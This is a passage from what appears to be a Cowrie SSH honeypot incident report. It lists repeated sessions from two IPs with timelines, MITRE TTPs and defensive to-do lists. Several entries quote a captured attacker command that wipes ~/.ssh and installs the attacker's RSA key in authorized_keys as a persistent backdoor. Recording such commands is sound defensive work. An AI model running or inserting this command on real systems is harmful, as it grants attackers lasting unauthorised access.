| `2026-05-05 03:38:51` | `cowrie.client.kex` |
| `2026-05-05 03:38:52` | `cowrie.login.success` |
| `2026-05-05 03:38:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.168.30[.]30` to AbuseIPDB if not already reported
- [ ] Block `104.168.30[.]30` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ae53c7b43f9

| Field | Detail |
|---|---|
| **Source IP** | `104.168.30[.]30` |
| **First Seen** | 2026-05-05 03:40 |
| **Last Seen** | 2026-05-05 03:40 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 03:40:38` | `cowrie.session.connect` |
| `2026-05-05 03:40:38` | `cowrie.client.version` |
| `2026-05-05 03:40:38` | `cowrie.client.kex` |
| `2026-05-05 03:40:39` | `cowrie.login.success` |
| `2026-05-05 03:40:40` | `cowrie.session.params` |
| `2026-05-05 03:40:40` | `cowrie.command.input` |
| `2026-05-05 03:40:40` | `cowrie.command.failed` |
| `2026-05-05 03:40:40` | `cowrie.log.closed` |
| `2026-05-05 03:40:41` | `cowrie.session.params` |
| `2026-05-05 03:40:41` | `cowrie.command.input` |
| `2026-05-05 03:40:41` | `cowrie.session.file_download` |
| `2026-05-05 03:40:41` | `cowrie.log.closed` |
| `2026-05-05 03:40:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.168.30[.]30` to AbuseIPDB if not already reported
- [ ] Block `104.168.30[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48d84579169c

| Field | Detail |
|---|---|
| **Source IP** | `104.168.30[.]30` |
| **First Seen** | 2026-05-05 03:40 |
| **Last Seen** | 2026-05-05 03:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 03:40:44` | `cowrie.session.connect` |
| `2026-05-05 03:40:44` | `cowrie.client.version` |
| `2026-05-05 03:40:45` | `cowrie.client.kex` |
| `2026-05-05 03:40:46` | `cowrie.login.success` |
| `2026-05-05 03:40:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.168.30[.]30` to AbuseIPDB if not already reported
- [ ] Block `104.168.30[.]30` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5b9f9491aaf

| Field | Detail |
|---|---|
| **Source IP** | `43.159.177[.]40` |
| **First Seen** | 2026-05-05 03:41 |
| **Last Seen** | 2026-05-05 03:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 03:41:19` | `cowrie.session.connect` |
| `2026-05-05 03:41:19` | `cowrie.client.version` |
| `2026-05-05 03:41:19` | `cowrie.client.kex` |
| `2026-05-05 03:41:20` | `cowrie.login.success` |
| `2026-05-05 03:41:21` | `cowrie.session.params` |
| `2026-05-05 03:41:21` | `cowrie.command.input` |
| `2026-05-05 03:41:21` | `cowrie.command.failed` |
| `2026-05-05 03:41:21` | `cowrie.log.closed` |
| `2026-05-05 03:41:22` | `cowrie.session.params` |
| `2026-05-05 03:41:22` | `cowrie.command.input` |
| `2026-05-05 03:41:22` | `cowrie.session.file_download` |
| `2026-05-05 03:41:22` | `cowrie.log.closed` |
| `2026-05-05 03:41:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.159.177[.]40` to AbuseIPDB if not already reported
- [ ] Block `43.159.177[.]40` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a223e413b03e

| Field | Detail |
|---|---|
| **Source IP** | `43.159.177[.]40` |
| **First Seen** | 2026-05-05 03:41 |
| **Last Seen** | 2026-05-05 03:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 03:41:25` | `cowrie.session.connect` |
| `2026-05-05 03:41:25` | `cowrie.client.version` |
| `2026-05-05 03:41:25` | `cowrie.client.kex` |
| `2026-05-05 03:41:26` | `cowrie.login.success` |
| `2026-05-05 03:41:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.159.177[.]40` to AbuseIPDB if not already reported
- [ ] Block `43.159.177[.]40` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f71ad21d4eeb

| Field | Detail |
|---|---|
| **Source IP** | `104.168.30[.]30` |
| **First Seen** | 2026-05-05 03:41 |
| **Last Seen** | 2026-05-05 03:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 03:41:29` | `cowrie.session.connect` |
| `2026-05-05 03:41:29` | `cowrie.client.version` |
| `2026-05-05 03:41:29` | `cowrie.client.kex` |
| `2026-05-05 03:41:30` | `cowrie.login.success` |
| `2026-05-05 03:41:31` | `cowrie.session.params` |
| `2026-05-05 03:41:31` | `cowrie.command.input` |
| `2026-05-05 03:41:31` | `cowrie.command.failed` |
| `2026-05-05 03:41:31` | `cowrie.log.closed` |
| `2026-05-05 03:41:31` | `cowrie.session.params` |
| `2026-05-05 03:41:31` | `cowrie.command.input` |
| `2026-05-05 03:41:32` | `cowrie.session.file_download` |
| `2026-05-05 03:41:32` | `cowrie.log.closed` |
| `2026-05-05 03:41:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.168.30[.]30` to AbuseIPDB if not already reported
- [ ] Block `104.168.30[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7df149fd0685

| Field | Detail |
|---|---|
| **Source IP** | `104.168.30[.]30` |
| **First Seen** | 2026-05-05 03:41 |
| **Last Seen** | 2026-05-05 03:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 03:41:35` | `cowrie.session.connect` |
| `2026-05-05 03:41:35` | `cowrie.client.version` |
| `2026-05-05 03:41:35` | `cowrie.client.kex` |
| `2026-05-05 03:41:36` | `cowrie.login.success` |
| `2026-05-05 03:41:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.168.30[.]30` to AbuseIPDB if not already reported
- [ ] Block `104.168.30[.]30` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b957e1283367

| Field | Detail |
|---|---|
| **Source IP** | `104.168.30[.]30` |
| **First Seen** | 2026-05-05 03:42 |
| **Last Seen** | 2026-05-05 03:42 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 03:42:20` | `cowrie.session.connect` |
| `2026-05-05 03:42:20` | `cowrie.client.version` |
| `2026-05-05 03:42:20` | `cowrie.client.kex` |
| `2026-05-05 03:42:21` | `cowrie.login.success` |
| `2026-05-05 03:42:22` | `cowrie.session.params` |
| `2026-05-05 03:42:22` | `cowrie.command.input` |
| `2026-05-05 03:42:22` | `cowrie.command.failed` |
| `2026-05-05 03:42:22` | `cowrie.log.closed` |
| `2026-05-05 03:42:22` | `cowrie.session.params` |
| `2026-05-05 03:42:22` | `cowrie.command.input` |
| `2026-05-05 03:42:23` | `cowrie.session.file_download` |
| `2026-05-05 03:42:23` | `cowrie.log.closed` |
| `2026-05-05 03:42:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.168.30[.]30` to AbuseIPDB if not already reported
- [ ] Block `104.168.30[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80e7ca15f548

| Field | Detail |
|---|---|
| **Source IP** | `104.168.30[.]30` |
| **First Seen** | 2026-05-05 03:42 |
| **Last Seen** | 2026-05-05 03:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 03:42:26` | `cowrie.session.connect` |
| `2026-05-05 03:42:26` | `cowrie.client.version` |
| `2026-05-05 03:42:26` | `cowrie.client.kex` |
| `2026-05-05 03:42:27` | `cowrie.login.success` |
| `2026-05-05 03:42:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.168.30[.]30` to AbuseIPDB if not already reported
- [ ] Block `104.168.30[.]30` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-778e08398bb0

| Field | Detail |
|---|---|
| **Source IP** | `104.168.30[.]30` |
| **First Seen** | 2026-05-05 03:44 |
| **Last Seen** | 2026-05-05 03:44 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 03:44:01` | `cowrie.session.connect` |
| `2026-05-05 03:44:01` | `cowrie.client.version` |
| `2026-05-05 03:44:01` | `cowrie.client.kex` |
| `2026-05-05 03:44:02` | `cowrie.login.success` |
| `2026-05-05 03:44:03` | `cowrie.session.params` |
| `2026-05-05 03:44:03` | `cowrie.command.input` |
| `2026-05-05 03:44:03` | `cowrie.command.failed` |
| `2026-05-05 03:44:03` | `cowrie.log.closed` |
| `2026-05-05 03:44:04` | `cowrie.session.params` |
| `2026-05-05 03:44:04` | `cowrie.command.input` |
| `2026-05-05 03:44:04` | `cowrie.session.file_download` |
| `2026-05-05 03:44:04` | `cowrie.log.closed` |
| `2026-05-05 03:44:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.168.30[.]30` to AbuseIPDB if not already reported
- [ ] Block `104.168.30[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4dee436c48d2

| Field | Detail |
|---|---|
| **Source IP** | `104.168.30[.]30` |
| **First Seen** | 2026-05-05 03:44 |
| **Last Seen** | 2026-05-05 03:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 03:44:07` | `cowrie.session.connect` |
| `2026-05-05 03:44:07` | `cowrie.client.version` |
| `2026-05-05 03:44:07` | `cowrie.client.kex` |
| `2026-05-05 03:44:08` | `cowrie.login.success` |
| `2026-05-05 03:44:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.168.30[.]30` to AbuseIPDB if not already reported
- [ ] Block `104.168.30[.]30` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21d079aabacf

| Field | Detail |
|---|---|
| **Source IP** | `104.168.30[.]30` |
| **First Seen** | 2026-05-05 03:44 |
| **Last Seen** | 2026-05-05 03:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 03:44:52` | `cowrie.session.connect` |
| `2026-05-05 03:44:52` | `cowrie.client.version` |
| `2026-05-05 03:44:52` | `cowrie.client.kex` |
| `2026-05-05 03:44:53` | `cowrie.login.success` |
| `2026-05-05 03:44:54` | `cowrie.session.params` |
| `2026-05-05 03:44:54` | `cowrie.command.input` |
| `2026-05-05 03:44:54` | `cowrie.command.failed` |
| `2026-05-05 03:44:54` | `cowrie.log.closed` |
| `2026-05-05 03:44:55` | `cowrie.session.params` |
| `2026-05-05 03:44:55` | `cowrie.command.input` |
| `2026-05-05 03:44:55` | `cowrie.session.file_download` |
| `2026-05-05 03:44:55` | `cowrie.log.closed` |
| `2026-05-05 03:45:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.168.30[.]30` to AbuseIPDB if not already reported
- [ ] Block `104.168.30[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7305ce887648

| Field | Detail |
|---|---|
| **Source IP** | `104.168.30[.]30` |
| **First Seen** | 2026-05-05 03:44 |
| **Last Seen** | 2026-05-05 03:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 03:44:58` | `cowrie.session.connect` |
| `2026-05-05 03:44:58` | `cowrie.client.version` |
| `2026-05-05 03:44:59` | `cowrie.client.kex` |
| `2026-05-05 03:45:00` | `cowrie.login.success` |
| `2026-05-05 03:45:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.168.30[.]30` to AbuseIPDB if not already reported
- [ ] Block `104.168.30[.]30` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fdaedf4b660

| Field | Detail |
|---|---|
| **Source IP** | `104.168.30[.]30` |
| **First Seen** | 2026-05-05 03:45 |
| **Last Seen** | 2026-05-05 03:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 03:45:46` | `cowrie.session.connect` |
| `2026-05-05 03:45:46` | `cowrie.client.version` |
| `2026-05-05 03:45:46` | `cowrie.client.kex` |
| `2026-05-05 03:45:47` | `cowrie.login.success` |
| `2026-05-05 03:45:48` | `cowrie.session.params` |
| `2026-05-05 03:45:48` | `cowrie.command.input` |
| `2026-05-05 03:45:48` | `cowrie.command.failed` |
| `2026-05-05 03:45:48` | `cowrie.log.closed` |
| `2026-05-05 03:45:49` | `cowrie.session.params` |
| `2026-05-05 03:45:49` | `cowrie.command.input` |
| `2026-05-05 03:45:49` | `cowrie.session.file_download` |
| `2026-05-05 03:45:49` | `cowrie.log.closed` |
| `2026-05-05 03:45:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.168.30[.]30` to AbuseIPDB if not already reported
- [ ] Block `104.168.30[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1251cc546b4f

| Field | Detail |
|---|---|
| **Source IP** | `104.168.30[.]30` |
| **First Seen** | 2026-05-05 03:45 |
| **Last Seen** | 2026-05-05 03:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 03:45:52` | `cowrie.session.connect` |
| `2026-05-05 03:45:52` | `cowrie.client.version` |
| `2026-05-05 03:45:52` | `cowrie.client.kex` |
| `2026-05-05 03:45:53` | `cowrie.login.success` |
| `2026-05-05 03:45:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.168.30[.]30` to AbuseIPDB if not already reported
- [ ] Block `104.168.30[.]30` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0d372bb8cd4

| Field | Detail |
|---|---|
| **Source IP** | `104.168.30[.]30` |
| **First Seen** | 2026-05-05 03:47 |
| **Last Seen** | 2026-05-05 03:47 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 03:47:31` | `cowrie.session.connect` |
| `2026-05-05 03:47:31` | `cowrie.client.version` |
| `2026-05-05 03:47:32` | `cowrie.client.kex` |
| `2026-05-05 03:47:33` | `cowrie.login.success` |
| `2026-05-05 03:47:33` | `cowrie.session.params` |
| `2026-05-05 03:47:33` | `cowrie.command.input` |
| `2026-05-05 03:47:33` | `cowrie.command.failed` |
| `2026-05-05 03:47:33` | `cowrie.log.closed` |
| `2026-05-05 03:47:34` | `cowrie.session.params` |
| `2026-05-05 03:47:34` | `cowrie.command.input` |
| `2026-05-05 03:47:34` | `cowrie.session.file_download` |
| `2026-05-05 03:47:34` | `cowrie.log.closed` |
| `2026-05-05 03:47:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.168.30[.]30` to AbuseIPDB if not already reported
- [ ] Block `104.168.30[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bf22c10bae3

| Field | Detail |
|---|---|
| **Source IP** | `104.168.30[.]30` |
| **First Seen** | 2026-05-05 03:47 |
| **Last Seen** | 2026-05-05 03:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 03:47:37` | `cowrie.session.connect` |
| `2026-05-05 03:47:37` | `cowrie.client.version` |
| `2026-05-05 03:47:38` | `cowrie.client.kex` |
| `2026-05-05 03:47:39` | `cowrie.login.success` |
| `2026-05-05 03:47:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.168.30[.]30` to AbuseIPDB if not already reported
- [ ] Block `104.168.30[.]30` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-645d090c2486

| Field | Detail |
|---|---|
| **Source IP** | `104.168.30[.]30` |
| **First Seen** | 2026-05-05 03:48 |
| **Last Seen** | 2026-05-05 03:48 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
